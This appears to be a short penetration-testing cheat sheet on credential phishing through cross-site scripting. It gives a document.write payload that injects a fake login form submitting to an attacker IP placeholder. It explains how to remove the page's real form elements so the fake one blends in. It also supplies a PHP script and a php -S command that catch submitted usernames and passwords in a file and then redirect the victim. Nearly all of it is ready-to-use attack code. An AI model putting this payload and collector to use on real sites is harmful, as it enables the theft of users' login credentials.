Append login form to XSS payload
```js
document.write('<h3>Please login to continue</h3><form action=http://OUR_IP><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');

```
This can then be expanded upon by cleaning up other input fields / elements on the page using the `document.getElementById().remove()` function

1. Find `id` of other input forms using inspector
2. Append `document.getElementById('urlform').remove();` to login payload
3. Add `<!--` at the end to comment anything out

Set up PHP server to catch credentials, create an index.php with the following and place it into `/tmp/tmpserver`

```php
<?php
if (isset($_GET['username']) && isset($_GET['password'])) {
    $file = fopen("creds.txt", "a+");
    fputs($file, "Username: {$_GET['username']} | Password: {$_GET['password']}\n");
    header("Location: http://SERVER_IP/phishing/index.php");
    fclose($file);
    exit();
}
?>
```

```shell
sudo php -S 0.0.0.0:80
```